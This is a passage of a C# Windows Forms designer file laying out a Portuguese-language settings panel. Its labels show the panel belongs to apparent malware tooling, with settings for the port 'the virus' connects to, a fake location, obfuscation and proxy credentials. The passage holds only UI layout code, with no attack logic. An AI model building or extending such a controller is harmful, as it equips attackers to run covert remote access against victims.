            this.Guna2CheckBox13.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox13.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox13.Location = new System.Drawing.Point(321, 383);
            this.Guna2CheckBox13.Name = "Guna2CheckBox13";
            this.Guna2CheckBox13.Size = new System.Drawing.Size(173, 19);
            this.Guna2CheckBox13.TabIndex = 115;
            this.Guna2CheckBox13.Text = "Conexão lenta mais segura";
            this.Guna2CheckBox13.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox13.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox13.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox13.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox13.UseVisualStyleBackColor = false;
            // 
            // Guna2PictureBox62
            // 
            this.Guna2PictureBox62.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox62, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox62, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox62.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox62.Image")));
            this.Guna2PictureBox62.ImageRotate = 0F;
            this.Guna2PictureBox62.Location = new System.Drawing.Point(268, 22);
            this.Guna2PictureBox62.Name = "Guna2PictureBox62";
            this.Guna2PictureBox62.Size = new System.Drawing.Size(30, 30);
            this.Guna2PictureBox62.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox62.TabIndex = 19;
            this.Guna2PictureBox62.TabStop = false;
            this.Guna2PictureBox62.UseTransparentBackground = true;
            // 
            // Guna2HtmlLabel115
            // 
            this.Guna2HtmlLabel115.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel115, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel115, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel115.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel115.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel115.Location = new System.Drawing.Point(40, 428);
            this.Guna2HtmlLabel115.Name = "Guna2HtmlLabel115";
            this.Guna2HtmlLabel115.Size = new System.Drawing.Size(230, 15);
            this.Guna2HtmlLabel115.TabIndex = 85;
            this.Guna2HtmlLabel115.Text = "Configure a porta à qual o vírus se conectará";
            // 
            // Guna2Button2
            // 
            this.Guna2Button2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2Button2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2Button2.BorderRadius = 6;
            this.Guna2Button2.BorderThickness = 1;
            this.Guna2Transition1.SetDecoration(this.Guna2Button2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2Button2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Button2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button2.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2Button2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2Button2.FillColor = System.Drawing.Color.Transparent;
            this.Guna2Button2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2Button2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(156)))), ((int)(((byte)(176)))));
            this.Guna2Button2.Image = ((System.Drawing.Image)(resources.GetObject("Guna2Button2.Image")));
            this.Guna2Button2.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2Button2.Location = new System.Drawing.Point(17, 252);
            this.Guna2Button2.Name = "Guna2Button2";
            this.Guna2Button2.Size = new System.Drawing.Size(271, 32);
            this.Guna2Button2.TabIndex = 100;
            this.Guna2Button2.Text = "Carregar arquivo";
            this.Guna2Button2.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // Guna2CheckBox12
            // 
            this.Guna2CheckBox12.Animated = true;
            this.Guna2CheckBox12.AutoSize = true;
            this.Guna2CheckBox12.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox12.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox12.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox12.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox12.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox12.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox12.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox12.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox12.Location = new System.Drawing.Point(321, 360);
            this.Guna2CheckBox12.Name = "Guna2CheckBox12";
            this.Guna2CheckBox12.Size = new System.Drawing.Size(175, 19);
            this.Guna2CheckBox12.TabIndex = 114;
            this.Guna2CheckBox12.Text = "Não exibir papel de parede";
            this.Guna2CheckBox12.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox12.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox12.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox12.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox12.UseVisualStyleBackColor = false;
            // 
            // Guna2CheckBox2
            // 
            this.Guna2CheckBox2.Animated = true;
            this.Guna2CheckBox2.AutoSize = true;
            this.Guna2CheckBox2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2CheckBox2.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox2.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox2.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox2.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox2.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox2.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox2.Location = new System.Drawing.Point(377, 580);
            this.Guna2CheckBox2.Name = "Guna2CheckBox2";
            this.Guna2CheckBox2.Size = new System.Drawing.Size(134, 19);
            this.Guna2CheckBox2.TabIndex = 91;
            this.Guna2CheckBox2.Text = "Autenticação Proxy";
            this.Guna2CheckBox2.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox2.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox2.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox2.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox2.UseVisualStyleBackColor = false;
            // 
            // Guna2HtmlLabel78
            // 
            this.Guna2HtmlLabel78.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel78, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel78, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel78.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel78.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel78.Location = new System.Drawing.Point(323, 256);
            this.Guna2HtmlLabel78.Name = "Guna2HtmlLabel78";
            this.Guna2HtmlLabel78.Size = new System.Drawing.Size(358, 15);
            this.Guna2HtmlLabel78.TabIndex = 99;
            this.Guna2HtmlLabel78.Text = "Configure o limite de conexões que podem aparecer no seu Software!";
            // 
            // Guna2HtmlLabel114
            // 
            this.Guna2HtmlLabel114.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel114, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel114, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel114.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel114.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel114.Location = new System.Drawing.Point(11, 398);
            this.Guna2HtmlLabel114.Name = "Guna2HtmlLabel114";
            this.Guna2HtmlLabel114.Size = new System.Drawing.Size(145, 19);
            this.Guna2HtmlLabel114.TabIndex = 67;
            this.Guna2HtmlLabel114.Text = "Configurações da porta";
            // 
            // Guna2HtmlLabel119
            // 
            this.Guna2HtmlLabel119.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel119, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel119, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel119.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel119.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel119.Location = new System.Drawing.Point(403, 667);
            this.Guna2HtmlLabel119.Name = "Guna2HtmlLabel119";
            this.Guna2HtmlLabel119.Size = new System.Drawing.Size(40, 19);
            this.Guna2HtmlLabel119.TabIndex = 90;
            this.Guna2HtmlLabel119.Text = "Senha";
            // 
            // Guna2PictureBox63
            // 
            this.Guna2PictureBox63.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox63, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox63, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox63.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox63.Image")));
            this.Guna2PictureBox63.ImageRotate = 0F;
            this.Guna2PictureBox63.Location = new System.Drawing.Point(657, 222);
            this.Guna2PictureBox63.Name = "Guna2PictureBox63";
            this.Guna2PictureBox63.Size = new System.Drawing.Size(30, 30);
            this.Guna2PictureBox63.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox63.TabIndex = 19;
            this.Guna2PictureBox63.TabStop = false;
            this.Guna2PictureBox63.UseTransparentBackground = true;
            // 
            // Guna2TextBox9
            // 
            this.Guna2TextBox9.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2TextBox9.BorderRadius = 3;
            this.Guna2TextBox9.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.Guna2TextBox9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2TextBox9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2TextBox9.DefaultText = "ABCDEFGHIJKLMNOPQRSTUV";
            this.Guna2TextBox9.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.Guna2TextBox9.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.Guna2TextBox9.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox9.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox9.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox9.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox9.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2TextBox9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox9.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox9.IconLeft = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox9.IconLeft")));
            this.Guna2TextBox9.IconRight = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox9.IconRight")));
            this.Guna2TextBox9.Location = new System.Drawing.Point(403, 691);
            this.Guna2TextBox9.Name = "Guna2TextBox9";
            this.Guna2TextBox9.PasswordChar = '*';
            this.Guna2TextBox9.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox9.PlaceholderText = "BE012BGAJSYHEGSKFNHAVGDUGYWFWD";
            this.Guna2TextBox9.SelectedText = "";
            this.Guna2TextBox9.Size = new System.Drawing.Size(288, 29);
            this.Guna2TextBox9.TabIndex = 89;
            // 
            // Guna2HtmlLabel54
            // 
            this.Guna2HtmlLabel54.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel54, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel54, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel54.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel54.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel54.Location = new System.Drawing.Point(323, 222);
            this.Guna2HtmlLabel54.Name = "Guna2HtmlLabel54";
            this.Guna2HtmlLabel54.Size = new System.Drawing.Size(115, 19);
            this.Guna2HtmlLabel54.TabIndex = 98;
            this.Guna2HtmlLabel54.Text = "Limites de Sessões";
            // 
            // Guna2HtmlLabel120
            // 
            this.Guna2HtmlLabel120.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel120, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel120, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel120.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel120.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel120.Location = new System.Drawing.Point(403, 605);
            this.Guna2HtmlLabel120.Name = "Guna2HtmlLabel120";
            this.Guna2HtmlLabel120.Size = new System.Drawing.Size(151, 19);
            this.Guna2HtmlLabel120.TabIndex = 88;
            this.Guna2HtmlLabel120.Text = "Nome de Usuario/E-mail";
            // 
            // Guna2PictureBox60
            // 
            this.Guna2PictureBox60.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox60, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox60, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox60.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox60.Image")));
            this.Guna2PictureBox60.ImageRotate = 0F;
            this.Guna2PictureBox60.Location = new System.Drawing.Point(347, 700);
            this.Guna2PictureBox60.Name = "Guna2PictureBox60";
            this.Guna2PictureBox60.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox60.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox60.TabIndex = 113;
            this.Guna2PictureBox60.TabStop = false;
            this.Guna2PictureBox60.UseTransparentBackground = true;
            // 
            // Guna2HtmlLabel121
            // 
            this.Guna2HtmlLabel121.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel121, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel121, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel121.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel121.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel121.Location = new System.Drawing.Point(333, 503);
            this.Guna2HtmlLabel121.Name = "Guna2HtmlLabel121";
            this.Guna2HtmlLabel121.Size = new System.Drawing.Size(54, 19);
            this.Guna2HtmlLabel121.TabIndex = 87;
            this.Guna2HtmlLabel121.Text = "Proxy IP";
            // 
            // Guna2HtmlLabel76
            // 
            this.Guna2HtmlLabel76.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel76, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel76, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel76.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel76.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel76.Location = new System.Drawing.Point(323, 332);
            this.Guna2HtmlLabel76.Name = "Guna2HtmlLabel76";
            this.Guna2HtmlLabel76.Size = new System.Drawing.Size(357, 15);
            this.Guna2HtmlLabel76.TabIndex = 97;
            this.Guna2HtmlLabel76.Text = "As configurações são importantes para o funcionamento do software!";
            // 
            // Guna2TextBox10
            // 
            this.Guna2TextBox10.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2TextBox10.BorderRadius = 3;
            this.Guna2TextBox10.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.Guna2TextBox10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2TextBox10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2TextBox10.DefaultText = "Andromeda-Proxy@administrador";
            this.Guna2TextBox10.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.Guna2TextBox10.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.Guna2TextBox10.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox10.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox10.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox10.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox10.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2TextBox10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox10.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox10.IconLeft = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox10.IconLeft")));
            this.Guna2TextBox10.IconRight = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox10.IconRight")));
            this.Guna2TextBox10.Location = new System.Drawing.Point(405, 630);
            this.Guna2TextBox10.Name = "Guna2TextBox10";
            this.Guna2TextBox10.PasswordChar = '\0';
            this.Guna2TextBox10.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox10.PlaceholderText = "*******";
            this.Guna2TextBox10.SelectedText = "";
            this.Guna2TextBox10.Size = new System.Drawing.Size(288, 29);
            this.Guna2TextBox10.TabIndex = 86;
            // 
            // Guna2HtmlLabel122
            // 
            this.Guna2HtmlLabel122.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel122, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel122, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel122.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel122.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel122.Location = new System.Drawing.Point(340, 476);
            this.Guna2HtmlLabel122.Name = "Guna2HtmlLabel122";
            this.Guna2HtmlLabel122.Size = new System.Drawing.Size(327, 15);
            this.Guna2HtmlLabel122.TabIndex = 85;
            this.Guna2HtmlLabel122.Text = "Lembrando que cada ofuscamento pode deixar a conexão lenta";
            // 
            // Guna2PictureBox59
            // 
            this.Guna2PictureBox59.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox59, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox59, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox59.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox59.Image")));
            this.Guna2PictureBox59.ImageRotate = 0F;
            this.Guna2PictureBox59.Location = new System.Drawing.Point(184, 705);
            this.Guna2PictureBox59.Name = "Guna2PictureBox59";
            this.Guna2PictureBox59.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox59.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox59.TabIndex = 112;
            this.Guna2PictureBox59.TabStop = false;
            this.Guna2PictureBox59.UseTransparentBackground = true;
            // 
            // Guna2TextBox11
            // 
            this.Guna2TextBox11.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2TextBox11.BorderRadius = 3;
            this.Guna2TextBox11.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.Guna2TextBox11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2TextBox11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2TextBox11.DefaultText = "";
            this.Guna2TextBox11.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.Guna2TextBox11.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.Guna2TextBox11.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox11.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox11.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox11.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox11.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2TextBox11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox11.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox11.IconLeft = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox11.IconLeft")));
            this.Guna2TextBox11.Location = new System.Drawing.Point(333, 536);
            this.Guna2TextBox11.Name = "Guna2TextBox11";
            this.Guna2TextBox11.PasswordChar = '\0';
            this.Guna2TextBox11.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox11.PlaceholderText = "219.231.192.67";
            this.Guna2TextBox11.SelectedText = "";
            this.Guna2TextBox11.Size = new System.Drawing.Size(363, 29);
            this.Guna2TextBox11.TabIndex = 75;
            // 
            // Guna2HtmlLabel113
            // 
            this.Guna2HtmlLabel113.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel113, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel113, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel113.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel113.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel113.Location = new System.Drawing.Point(321, 154);
            this.Guna2HtmlLabel113.Name = "Guna2HtmlLabel113";
            this.Guna2HtmlLabel113.Size = new System.Drawing.Size(104, 19);
            this.Guna2HtmlLabel113.TabIndex = 96;
            this.Guna2HtmlLabel113.Text = "Localização Falsa";
            // 
            // Guna2PictureBox48
            // 
            this.Guna2PictureBox48.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox48, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox48, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox48.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox48.Image")));
            this.Guna2PictureBox48.ImageRotate = 0F;
            this.Guna2PictureBox48.Location = new System.Drawing.Point(657, 418);
